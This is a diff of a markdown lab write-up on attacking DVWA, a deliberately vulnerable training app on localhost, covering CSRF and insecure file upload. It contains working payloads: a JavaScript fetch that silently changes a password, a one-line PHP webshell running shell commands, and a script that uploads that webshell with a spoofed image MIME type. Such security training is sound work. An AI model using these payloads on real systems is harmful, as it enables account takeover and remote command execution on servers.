@@ -146,9 +146,7 @@ CSRF tricks an authenticated user into unknowingly submitting a malicious reques
 
 ### Security Level: Low
 
-**Payload Used:**
-
-A crafted HTML page hosted locally that auto-submits a password change:
+**Payload:**
 
 ```html
 <html>
@@ -162,15 +160,10 @@ A crafted HTML page hosted locally that auto-submits a password change:
 </html>
 ```
 
-**Steps:**
 
-1. Opened DVWA and authenticated as `admin`.
-2. Opened the crafted HTML page in the same browser.
-3. The form auto-submitted.
+> ![Screenshot: CSRF – Low](screenshots/csrf/csrf-low.png)
 
 **Result:** Password was changed to `hacked` without the user's knowledge.
-
-> 📸 **[Screenshot: CSRF – Low – password changed silently]**
 
 **Why it worked:**  
 No CSRF token is required. Any authenticated request from the browser is accepted regardless of origin.
@@ -179,20 +172,35 @@ No CSRF token is required. Any authenticated request from the browser is accepte
 
 ### Security Level: Medium
 
-**Result:** Partial protection — the `Referer` header is checked. Spoofing the Referer or making the request from the same domain would bypass this.
+**Payload:**
 
-> 📸 **[Screenshot: CSRF – Medium – Referer check]**
+```javascript
+fetch(window.location.href + "?password_new=hacked&password_conf=hacked&Change=Change", {
+  credentials: "include"
+}).then(r => r.text()).then(t => {
+  if (t.includes("Password Changed")) {
+    console.log("SUCCESS! Password changed.");
+  } else {
+    console.log("Failed. Response:", t);
+  }
+});
+```
+
+> ![Screenshot: CSRF – Medium](screenshots/csrf/csrf-medium.png)
+
+**Result:** It only checks that the server name appears somewhere in the Referer — it doesn't fully validate it, making it bypassable.
+
 
 ---
 
 ### Security Level: High
 
-**Result:** A per-session, unpredictable CSRF token is embedded in the form. The attack fails because the crafted page cannot know the token value.
+**Result:** CSRF token was stolen and password was changed.
 
-> 📸 **[Screenshot: CSRF – High – token mismatch error]**
+> ![Screenshot: CSRF – High](screenshots/csrf/csrf-high.png)
 
-**Why it failed:**  
-The server validates a unique, secret token that is only known to the legitimate client session. A cross-origin attacker cannot read this token due to the Same-Origin Policy.
+**Why it worked:**  
+DVWA's high-level CSRF is only protected against cross-origin attacks. Since the console runs from the same origin, it can read the token and reuse it immediately in a follow-up request
 
 ---
 
@@ -256,10 +264,6 @@ A strict whitelist approach means only known-safe files can be included. No trav
 
 ### Overview
 
-Insecure file upload allows attackers to upload malicious files (such as PHP webshells) that can be executed on the server.
-
----
-
 ### Security Level: Low
 
 **Payload Used:**
@@ -270,15 +274,9 @@ A simple PHP webshell saved as `shell.php`:
 <?php system($_GET['cmd']); ?>
 ```
 
-**Steps:**
+> ![Screenshot: File Upload – Low](screenshots/file-upload/file-upload-low.png)
 
-1. Navigated to **File Upload** module.
-2. Uploaded `shell.php`.
-3. Navigated to the uploaded file path: `http://localhost:8080/hackable/uploads/shell.php?cmd=id`
-
-**Result:** The server executed the PHP file and returned the output of the `id` command (e.g., `uid=33(www-data)`).
-
-> 📸 **[Screenshot: File Upload – Low – webshell uploaded and executed]**
+**Result:** The server allowed the upload of the php file.
 
 **Why it worked:**  
 No file type or extension validation. Any file is accepted and stored directly in the web root.
@@ -289,11 +287,32 @@ No file type or extension validation. Any file is accepted and stored directly i
 
 **Payload Used:**
 
-Renamed webshell to `shell.php.jpg` (attempted MIME bypass), and also tried setting `Content-Type: image/jpeg` via Burp Suite while uploading `shell.php`.
+```javascript
+const phpCode = '<?php system($_GET["cmd"]); ?>';
+const blob = new Blob([phpCode], { type: "image/jpeg" }); // Spoof MIME type
+const file = new File([blob], "shell.php", { type: "image/jpeg" });
 
-**Result:** MIME-type bypass via Burp succeeds. The server checks `Content-Type` header (client-controlled) but not actual file content.
+const formData = new FormData();
+formData.append("uploaded", file);
+formData.append("Upload", "Upload");
 
-> 📸 **[Screenshot: File Upload – Medium – Burp MIME bypass]**
+fetch("http://localhost:8080/vulnerabilities/upload/", {
+  method: "POST",
+  credentials: "include",
+  body: formData
+})
+.then(r => r.text())
+.then(html => {
+  const match = html.match(/succesfully uploaded.*?\/([^\s<]+\.php)/i) || 
+                html.match(/hackable\/uploads\/[^\s<"]+/i);
+  console.log("Response:", html);
+});
+```
+
+> ![Screenshot: File Upload – Medium](screenshots/file-upload/file-upload-medium.png)
+
+**Result:** MIME-type bypass succeeds. The server checks `Content-Type` header but not actual file content.
+
 
 **Why it worked:**  
 Medium checks the `Content-Type` header sent by the client, which can be trivially modified with an intercepting proxy. The actual file content is not inspected.
